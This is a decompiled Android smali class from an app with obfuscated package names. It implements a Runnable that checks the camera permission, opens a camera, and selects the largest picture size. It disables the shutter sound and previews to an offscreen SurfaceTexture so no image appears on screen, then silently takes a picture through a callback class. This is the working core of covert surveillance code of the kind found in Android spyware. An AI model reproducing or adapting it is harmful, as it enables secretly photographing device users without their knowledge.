.class public final synthetic Ls0/h;
.super Ljava/lang/Object;
.source "r8-map-id-7d7ae25efe95319b69974e8de8fecbf659b28a04fb22faa5664366b60d5b8370"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic a:Lf/b0;

.field public final synthetic b:I


# direct methods
.method public synthetic constructor <init>(Lf/b0;I)V
    .locals 0

    .line 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 2
    .line 3
    .line 4
    iput-object p1, p0, Ls0/h;->a:Lf/b0;

    .line 5
    .line 6
    iput p2, p0, Ls0/h;->b:I

    .line 7
    .line 8
    return-void
.end method


# virtual methods
.method public final run()V
    .locals 10

    .line 1
    iget v0, p0, Ls0/h;->b:I

    .line 2
    .line 3
    iget-object v1, p0, Ls0/h;->a:Lf/b0;

    .line 4
    .line 5
    iget-object v1, v1, Lf/b0;->b:Ljava/lang/Object;

    .line 6
    .line 7
    check-cast v1, Lcgn/cdfbgd/s;

    .line 8
    .line 9
    sget-boolean v2, Lcgn/cdfbgd/s;->b:Z

    .line 10
    .line 11
    invoke-virtual {v1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    .line 12
    .line 13
    .line 14
    move-result-object v1

    .line 15
    const-string v2, "android.permission.CAMERA"

    .line 16
    .line 17
    invoke-static {v1, v2}, Lq/f;->a(Landroid/content/Context;Ljava/lang/String;)I

    .line 18
    .line 19
    .line 20
    move-result v1

    .line 21
    const/4 v2, -0x1

    .line 22
    if-ne v1, v2, :cond_0

    .line 23
    .line 24
    goto :goto_2

    .line 25
    :cond_0
    const/4 v1, 0x0

    .line 26
    :try_start_0
    invoke-static {v0}, Landroid/hardware/Camera;->open(I)Landroid/hardware/Camera;

    .line 27
    .line 28
    .line 29
    move-result-object v2
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_3

    .line 30
    if-nez v2, :cond_1

    .line 31
    .line 32
    goto :goto_2

    .line 33
    :cond_1
    :try_start_1
    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    .line 34
    .line 35
    .line 36
    move-result-object v3

    .line 37
    invoke-virtual {v3}, Landroid/hardware/Camera$Parameters;->getSupportedPictureSizes()Ljava/util/List;

    .line 38
    .line 39
    .line 40
    move-result-object v4

    .line 41
    const/4 v5, 0x0

    .line 42
    invoke-interface {v4, v5}, Ljava/util/List;->get(I)Ljava/lang/Object;

    .line 43
    .line 44
    .line 45
    move-result-object v6

    .line 46
    check-cast v6, Landroid/hardware/Camera$Size;

    .line 47
    .line 48
    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 49
    .line 50
    .line 51
    move-result-object v4

    .line 52
    :cond_2
    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    .line 53
    .line 54
    .line 55
    move-result v7

    .line 56
    if-eqz v7, :cond_3

    .line 57
    .line 58
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 59
    .line 60
    .line 61
    move-result-object v7

    .line 62
    check-cast v7, Landroid/hardware/Camera$Size;

    .line 63
    .line 64
    iget v8, v7, Landroid/hardware/Camera$Size;->width:I

    .line 65
    .line 66
    iget v9, v6, Landroid/hardware/Camera$Size;->width:I

    .line 67
    .line 68
    if-le v8, v9, :cond_2

    .line 69
    .line 70
    move-object v6, v7

    .line 71
    goto :goto_0

    .line 72
    :catch_0
    move-object v1, v2

    .line 73
    goto :goto_1

    .line 74
    :cond_3
    iget v4, v6, Landroid/hardware/Camera$Size;->width:I

    .line 75
    .line 76
    iget v6, v6, Landroid/hardware/Camera$Size;->height:I

    .line 77
    .line 78
    invoke-virtual {v3, v4, v6}, Landroid/hardware/Camera$Parameters;->setPictureSize(II)V

    .line 79
    .line 80
    .line 81
    const-string v4, "shutter-sound"

    .line 82
    .line 83
    const-string v6, "off"

    .line 84
    .line 85
    invoke-virtual {v3, v4, v6}, Landroid/hardware/Camera$Parameters;->set(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/RuntimeException; {:try_start_1 .. :try_end_1} :catch_0

    .line 86
    .line 87
    .line 88
    :try_start_2
    invoke-virtual {v2, v5}, Landroid/hardware/Camera;->enableShutterSound(Z)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 89
    .line 90
    .line 91
    :catch_1
    :try_start_3
    invoke-virtual {v2, v3}, Landroid/hardware/Camera;->setParameters(Landroid/hardware/Camera$Parameters;)V
    :try_end_3
    .catch Ljava/lang/RuntimeException; {:try_start_3 .. :try_end_3} :catch_0

    .line 92
    .line 93
    .line 94
    :try_start_4
    new-instance v3, Landroid/graphics/SurfaceTexture;

    .line 95
    .line 96
    invoke-direct {v3, v5}, Landroid/graphics/SurfaceTexture;-><init>(I)V

    .line 97
    .line 98
    .line 99
    invoke-virtual {v2, v3}, Landroid/hardware/Camera;->setPreviewTexture(Landroid/graphics/SurfaceTexture;)V

    .line 100
    .line 101
    .line 102
    invoke-virtual {v2}, Landroid/hardware/Camera;->startPreview()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/lang/RuntimeException; {:try_start_4 .. :try_end_4} :catch_0

    .line 103
    .line 104
    .line 105
    :try_start_5
    new-instance v3, Ls0/i;

    .line 106
    .line 107
    invoke-direct {v3, v0}, Ls0/i;-><init>(I)V

    .line 108
    .line 109
    .line 110
    invoke-virtual {v2, v1, v1, v3}, Landroid/hardware/Camera;->takePicture(Landroid/hardware/Camera$ShutterCallback;Landroid/hardware/Camera$PictureCallback;Landroid/hardware/Camera$PictureCallback;)V

    .line 111
    .line 112
    .line 113
    goto :goto_2

    .line 114
    :catch_2
    invoke-virtual {v2}, Landroid/hardware/Camera;->release()V
    :try_end_5
    .catch Ljava/lang/RuntimeException; {:try_start_5 .. :try_end_5} :catch_0

    .line 115
    .line 116
    .line 117
    goto :goto_2

    .line 118
    :catch_3
    :goto_1
    if-eqz v1, :cond_4

    .line 119
    .line 120
    invoke-virtual {v1}, Landroid/hardware/Camera;->release()V

    .line 121
    .line 122
    .line 123
    :cond_4
    :goto_2
    return-void
.end method
